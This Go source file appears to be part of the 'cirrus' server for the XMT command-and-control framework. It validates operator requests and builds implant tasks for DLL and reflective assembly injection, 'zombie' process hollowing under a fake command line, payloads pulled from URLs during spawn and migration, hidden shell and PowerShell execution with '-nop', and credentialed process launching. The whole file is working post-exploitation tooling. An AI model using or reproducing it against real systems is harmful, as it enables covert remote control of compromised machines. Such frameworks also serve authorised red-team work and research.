// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cirrus

import (
	"encoding/base64"
	"encoding/json"
	"strings"

	"github.com/PurpleSec/routex/val"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	errInvalidB64      = xerr.New("invalid base64 value")
	errInvalidData     = xerr.New(`invalid or empty "data" value`)
	errInvalidFake     = xerr.New(`invalid or empty "fake" value`)
	errInvalidMethod   = xerr.New(`invalid "method" value`)
	errInvalidCommand  = xerr.New(`invalid or empty "command" value`)
	errInvalidPayload  = xerr.New(`invalid "payload" value`)
	errInvalidDataPath = xerr.New(`specify a non-empty "data" or "path" value`)
)

var valFilter = val.Validator{
	Name: "filter", Type: val.Object, Optional: true, Rules: val.Rules{
		val.SubSet{
			val.Validator{Name: "pid", Type: val.Int, Optional: true},
			val.Validator{Name: "session", Type: val.Bool, Optional: true},
			val.Validator{Name: "fallback", Type: val.Bool, Optional: true},
			val.Validator{Name: "elevated", Type: val.Bool, Optional: true},
			val.Validator{Name: "exclude", Type: val.ListString, Optional: true},
			val.Validator{Name: "include", Type: val.ListString, Optional: true},
		},
	},
}

var (
	valPullEx = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "url", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskDLL = val.Set{
		val.Validator{Name: "path", Type: val.String, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "reflect", Type: val.Bool, Optional: true},
		valFilter,
	}
	valTaskPull = val.Set{
		val.Validator{Name: "url", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskSpawn = val.Set{
		val.Validator{Name: "payload", Type: val.Any, Optional: true},
		val.Validator{Name: "method", Type: val.String, Optional: true},
		val.Validator{Name: "profile", Type: val.String, Optional: true},
		val.Validator{Name: "name", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskLogin = val.Set{
		val.Validator{Name: "pass", Type: val.String, Optional: true},
		val.Validator{Name: "domain", Type: val.String, Optional: true},
		val.Validator{Name: "user", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskZombie = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "fake", Type: val.String, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "user", Type: val.String, Optional: true},
		val.Validator{Name: "pass", Type: val.String, Optional: true},
		val.Validator{Name: "domain", Type: val.String, Optional: true},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskScript = val.Set{
		val.Validator{Name: "script", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskSystem = val.Set{
		val.Validator{Name: "cmd", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskSimple = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "user", Type: val.String, Optional: true},
		val.Validator{Name: "pass", Type: val.String, Optional: true},
		val.Validator{Name: "stdin", Type: val.String, Optional: true},
		val.Validator{Name: "domain", Type: val.String, Optional: true},
		val.Validator{Name: "cmd", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskUpload = val.Set{
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "data", Type: val.String},
	}
	valTaskProfile = val.Set{
		val.Validator{Name: "profile", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskMigrate = val.Set{
		val.Validator{Name: "wait", Type: val.Bool, Optional: true},
		val.Validator{Name: "payload", Type: val.Any, Optional: true},
		val.Validator{Name: "method", Type: val.String, Optional: true},
		val.Validator{Name: "profile", Type: val.String, Optional: true},
		val.Validator{Name: "name", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskWindowUI = val.Set{
		val.Validator{Name: "x", Type: val.Int, Optional: true},
		val.Validator{Name: "y", Type: val.Int, Optional: true},
		val.Validator{Name: "width", Type: val.Int, Optional: true},
		val.Validator{Name: "heigh", Type: val.Int, Optional: true},
		val.Validator{Name: "state", Type: val.Any, Optional: true},
		val.Validator{Name: "handle", Type: val.Int, Optional: true},
		val.Validator{Name: "text", Type: val.String, Optional: true},
		val.Validator{Name: "path", Type: val.String, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "enable", Type: val.Bool, Optional: true},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "flags", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
		val.Validator{Name: "title", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "seconds", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
		val.Validator{Name: "level", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(256)}},
	}
	valTaskAssembly = val.Set{
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskSystemIo = val.Set{
		val.Validator{Name: "force", Type: val.Bool, Optional: true},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "name", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "path", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "dest", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "source", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "pid", Type: val.Int, Optional: true, Rules: val.Rules{val.GreaterThanZero}},
	}
	valTaskDownload = val.Set{
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskRegistry = val.Set{
		val.Validator{Name: "force", Type: val.Bool, Optional: true},
		val.Validator{Name: "type", Type: val.String, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "value", Type: val.String, Optional: true},
		val.Validator{Name: "key", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
)

const (
	boolNone  taskBool = 0
	boolTrue  taskBool = 2
	boolFalse taskBool = 1
)

type taskBool uint8
type taskDLL struct {
	Path string `json:"path"`
	Line string `json:"line"`
	taskAssembly
	Reflect taskBool `json:"reflect"`
}
type taskPull struct {
	URL   string `json:"url"`
	Line  string `json:"line"`
	Agent string `json:"agent"`
	taskExecute
}
type taskSpawn struct {
	Filter  *filter.Filter  `json:"filter"`
	Line    string          `json:"line"`
	Name    string          `json:"name"`
	Method  string          `json:"method"`
	Profile string          `json:"profile"`
	Payload json.RawMessage `json:"payload"`
}
type taskZombie struct {
	Line   string `json:"line"`
	Fake   string `json:"fake"`
	User   string `json:"user"`
	Pass   string `json:"pass"`
	Domain string `json:"domain"`
	taskAssembly
}
type taskSystem struct {
	Filter  *filter.Filter `json:"filter"`
	Line    string         `json:"line"`
	Args    string         `json:"args"`
	Command string         `json:"cmd"`
}
type taskMigrate struct {
	Line string `json:"line"`
	taskSpawn
	Wait taskBool `json:"wait"`
}
type taskAssembly struct {
	Line string `json:"line"`
	Data string `json:"data"`
	taskExecute
}
type taskCommand struct {
	Line    string `json:"line"`
	User    string `json:"user"`
	Pass    string `json:"pass"`
	Stdin   string `json:"stdin"`
	Domain  string `json:"domain"`
	Command string `json:"cmd"`
	taskExecute
}
type taskExecute struct {
	Filter *filter.Filter `json:"filter"`
	Line   string         `json:"line"`
	Show   taskBool       `json:"show"`
	Detach taskBool       `json:"detach"`
}
type callableTasklet interface {
	task.Callable
	task.Tasklet
}

func ws(s val.Set) val.Set {
	if len(s) == 0 {
		return val.Set{val.Validator{Name: "line", Type: val.String, Rules: val.Rules{val.NoEmpty}}}
	}
	n := make(val.Set, len(s)+1)
	n[copy(n, s)] = val.Validator{Name: "line", Type: val.String, Rules: val.Rules{val.NoEmpty}}
	return n
}
func (t taskDLL) Packet() (*com.Packet, error) {
	c, err := t.Callable()
	if err != nil {
		return nil, err
	}
	return c.Packet()
}
func (t taskAssembly) Payload() ([]byte, error) {
	b, err := base64.StdEncoding.DecodeString(t.Data)
	if len(b) == 0 || err != nil {
		return nil, errInvalidB64
	}
	return b, nil
}
func (b *taskBool) UnmarshalJSON(d []byte) error {
	if len(d) == 0 {
		*b = boolNone
		return nil
	}
	if d[0] == '"' && len(d) >= 1 {
		switch d[1] {
		case '1', 'T', 't':
			*b = boolTrue
			return nil
		case '0', 'F', 'f':
			*b = boolFalse
			return nil
		}
		*b = boolNone
		return nil
	}
	switch d[0] {
	case '1', 'T', 't':
		*b = boolTrue
		return nil
	case '0', 'F', 'f':
		*b = boolFalse
		return nil
	}
	*b = boolNone
	return nil
}
func (t taskZombie) Packet() (*com.Packet, error) {
	b, err := t.Payload()
	if err != nil {
		return nil, err
	}
	return (task.Zombie{
		Data:   cmd.DLLToASM("", b),
		Args:   cmd.Split(t.Fake),
		Hide:   t.Show != boolTrue,
		Wait:   t.Detach != boolTrue,
		User:   t.User,
		Pass:   t.Pass,
		Domain: t.Domain,
		Filter: t.Filter,
	}).Packet()
}
func (t taskCommand) Packet() (*com.Packet, error) {
	p := task.Process{
		Hide:   t.Show != boolTrue,
		Wait:   t.Detach != boolTrue,
		User:   t.User,
		Pass:   t.Pass,
		Domain: t.Domain,
		Filter: t.Filter,
	}
	var err error
	if p.Stdin, err = readEmptyB64(t.Stdin); err != nil {
		return nil, err
	}
	if len(t.Command) == 0 && len(t.Stdin) == 0 {
		return nil, errInvalidCommand
	}
	switch t.Command[0] {
	case '.':
		if len(t.Command) == 1 {
			p.Args = []string{"@SHELL@"}
		} else {
			p.Args = []string{"@SHELL@", t.Command[1:]}
		}
	case '$':
		if len(t.Command) == 1 {
			p.Args = []string{"@PHELL@"}
		} else {
			p.Args = []string{"@PHELL@", "-nop", "-nol", "-c", t.Command[1:]}
		}
	default:
		p.Args = cmd.Split(t.Command)
	}
	return p.Packet()
}
func (t taskAssembly) Packet() (*com.Packet, error) {
	b, err := t.Payload()
	if err != nil {
		return nil, err
	}
	return (task.Assembly{
		Data:   cmd.DLLToASM("", b),
		Wait:   t.Detach != boolTrue,
		Filter: t.Filter,
	}).Packet()
}
func (t taskSpawn) Callable() (task.Callable, error) {
	// NOTE(dij): The created instances are omitting the Filter value
	//            as this is set by the Spawn and Migrate functions when starting
	//            up.
	switch strings.ToLower(t.Method) {
	case "":
		return nil, nil
	case "dll":
		var v taskDLL
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 && len(v.Path) == 0 {
			return nil, errInvalidDataPath
		}
		i, err := v.Callable()
		if err != nil {
			return nil, err
		}
		return i.(task.Callable), nil
	case "asm":
		var v taskAssembly
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 {
			return nil, errInvalidData
		}
		b, err := v.Payload()
		if err != nil {
			return nil, err
		}
		return task.Assembly{
			Data: cmd.DLLToASM("", b),
			Wait: v.Detach != boolTrue,
		}, nil
	case "exec":
		var v taskCommand
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Command) == 0 {
			return nil, errInvalidCommand
		}
		i := task.Process{
			Hide:   v.Show != boolTrue,
			Wait:   v.Detach != boolTrue,
			User:   v.User,
			Pass:   v.Pass,
			Domain: v.Domain,
		}
		switch v.Command[0] {
		case '.':
			i.Args = []string{"@SHELL@", v.Command[1:]}
		case '$':
			i.Args = []string{"@PHELL@", "-nop", "-nol", "-c", v.Command[1:]}
		default:
			i.Args = cmd.Split(v.Command)
		}
		return i, nil
	case "zombie":
		var v taskZombie
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 {
			return nil, errInvalidData
		}
		if len(v.Fake) == 0 {
			return nil, errInvalidFake
		}
		b, err := v.Payload()
		if err != nil {
			return nil, err
		}
		return task.Zombie{
			Data:   cmd.DLLToASM("", b),
			Args:   cmd.Split(v.Fake),
			Hide:   v.Show != boolTrue,
			Wait:   v.Detach != boolTrue,
			User:   v.User,
			Pass:   v.Pass,
			Domain: v.Domain,
		}, nil
	}
	return nil, errInvalidMethod
}
func (t taskDLL) Callable() (callableTasklet, error) {
	if len(t.Path) > 0 {
		return task.DLL{
			Path:   t.Path,
			Wait:   t.Detach != boolTrue,
			Filter: t.Filter,
		}, nil
	}
	b, err := t.Payload()
	if err != nil {
		return nil, err
	}
	if t.Reflect == boolTrue {
		return task.Assembly{
			Data:   cmd.DLLToASM("", b),
			Wait:   t.Detach != boolTrue,
			Filter: t.Filter,
		}, nil
	}
	return task.DLL{
		Data:   b,
		Wait:   t.Detach != boolTrue,
		Filter: t.Filter,
	}, nil
}
func (t taskSpawn) Packet(p cfg.Config) (*com.Packet, error) {
	if t.Method == "pexec" {
		var m map[string]string
		if err := json.Unmarshal(t.Payload, &m); err == nil && len(m) > 0 {
			u, ok := m["url"]
			if !ok {
				return nil, errInvalidPayload
			}
			return task.SpawnPullProfile(t.Filter, t.Name, p, u, m["agent"]), nil
		}
		var u string
		if err := json.Unmarshal(t.Payload, &u); err != nil || len(u) == 0 {
			return nil, errInvalidPayload
		}
		return task.SpawnPullProfile(t.Filter, t.Name, p, u, ""), nil
	}
	c, err := t.Callable()
	if err != nil {
		return nil, err
	}
	return task.SpawnProfile(t.Filter, t.Name, p, c), nil
}
func (t taskMigrate) Packet(p cfg.Config) (*com.Packet, error) {
	if t.Method == "pexec" {
		var m map[string]string
		if err := json.Unmarshal(t.Payload, &m); err == nil && len(m) > 0 {
			u, ok := m["url"]
			if !ok {
				return nil, errInvalidPayload
			}
			return task.MigratePullProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, u, m["agent"]), nil
		}
		var u string
		if err := json.Unmarshal(t.Payload, &u); err != nil || len(u) == 0 {
			return nil, errInvalidPayload
		}
		return task.MigratePullProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, u, ""), nil
	}
	c, err := t.Callable()
	if err != nil {
		return nil, err
	}
	return task.MigrateProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, c), nil
}
